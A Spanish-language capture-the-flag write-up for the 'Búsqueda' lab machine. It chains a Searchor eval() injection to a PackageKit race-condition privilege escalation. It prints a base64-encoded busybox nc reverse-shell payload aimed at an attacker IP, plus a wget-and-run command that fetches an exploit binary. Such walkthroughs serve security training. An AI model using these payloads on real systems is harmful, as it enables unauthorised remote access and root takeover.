00 — Overview

Resumen Ejecutivo

Búsqueda es una máquina Linux de dificultad Easy que expone una aplicación web basada en Searchor 2.4.0, una librería Python vulnerable a inyección de código arbitrario a través de la función eval(). La superficie de ataque inicial es la propia aplicación web que corre sobre Werkzeug/Flask.

La escalada de privilegios a root se consigue mediante CVE-2026-41651, una vulnerabilidad TOCTOU en PackageKit que permite crear un SUID bash sin autenticación. Dos CVEs encadenadas, shell como svc, luego euid=0.

Attack Path
Searchor 2.4.0 eval() injection (CVE-2023-43364) → reverse shell como svc → CVE-2026-41651 PackageKit TOCTOU → SUID bash → root

02 — User

CVE-2023-43364 — Searchor eval() RCE

Fase 02 · Explotación
Python eval() no sanitizado → reverse shell como svc

Searchor 2.4.0 pasa el input del usuario directamente a eval() en el endpoint de búsqueda. Cualquier expresión Python válida se ejecuta en el servidor. El exploit público inyecta un payload busybox base64-encoded para evitar caracteres especiales en la URL.

# Exploit CVE-2023-43364
python3 exploit.py
# LHOST: 10.10.15.195 | LPORT: 4444 | TARGET: http://searcher.htb/search

# Payload inyectado — eval() ejecuta __import__('os').system()
', __import__('os').system('echo YnVzeWJveCBuYyAxMC4xMC4xNS4xOTUgNDQ0NCAtZSBiYXNo | base64 -d | bash -i')) #

03 — Root

CVE-2026-41651 — PackageKit TOCTOU LPE

Fase 03 · Privilege Escalation
PackageKit race condition → SUID bash → euid=0

El binario cve-2026-41651 abusa de una condición de carrera (TOCTOU) en PackageKit: envía dos transacciones InstallFiles asíncronas en rápida sucesión. Entre la verificación de la primera y la instalación de la segunda, el scheduler de PK ejecuta el paquete payload sin validar de nuevo. El resultado es una bash con SUID de root en /tmp/.suid_bash.

# Descargar y ejecutar el exploit
svc@busqueda:~$ wget http://10.10.15.195/cve-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
